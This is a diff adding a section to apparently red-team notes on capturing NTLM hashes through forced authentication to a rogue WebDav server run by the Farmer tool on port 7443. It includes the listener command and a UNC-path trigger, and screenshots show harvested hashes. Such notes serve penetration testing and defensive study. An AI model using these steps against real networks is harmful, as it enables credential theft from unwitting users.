@@ -164,6 +164,24 @@ If we have a foothold in a network, we can do the following:
 * Start cracking the hashes
 * Hopefully profit
 
+## Farmer Toolkit by MDSec
+
+When inside a network, we can attempt to elicit hashes from other users by forcing them to authenticate to our WebDav server that we can bind to any an unused port without administrator privileges. To achive this, we can use the tool called [Farmer](https://github.com/mdsecactivebreach/Farmer) by [@domchell](https://twitter.com/domchell?s=20).
+
+Below will make the farmer listen on port 7443:
+
+```text
+Farmer.exe 7443
+```
+
+Below shows how the Farmer successfully collects a hash for the user `spotless` when they are forced to authenticate to the malicious webdav when ls `\\spotless@7443\spotless.png` is executed:
+
+![](../../.gitbook/assets/image%20%28791%29.png)
+
+Below shows how the Farmer successfully collects a hash from a forced authentication via a shortcut icon:
+
+![](../../.gitbook/assets/harvest-hash-shortcut.gif)
+
 ## References
 
 {% embed url="http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf" %}
